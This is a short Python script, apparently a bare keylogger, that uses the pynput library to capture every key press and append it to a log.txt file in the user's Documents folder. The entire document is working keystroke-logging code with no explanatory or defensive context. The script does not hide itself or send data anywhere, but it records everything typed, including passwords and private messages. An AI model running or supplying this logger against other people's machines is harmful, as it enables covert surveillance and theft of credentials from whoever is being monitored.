import os
from pynput import keyboard

directory =os.path.join(os.path.expanduser("~"), "Documents", "log.txt")
pressed =set()

def onpress(key):
    global pressed
    letter = str(key).replace("'", "")

    if key in pressed:
        return 

    pressed.add(key)

    if letter=="Key.space":
        letter=" "

    with open(directory, 'a') as file:
        file.write(letter + '\n')

def onrelease(key):
    global pressed
    if key in pressed:
        pressed.remove(key)

with keyboard.Listener(on_press=onpress, on_release=onrelease) as listener:
    listener.join()

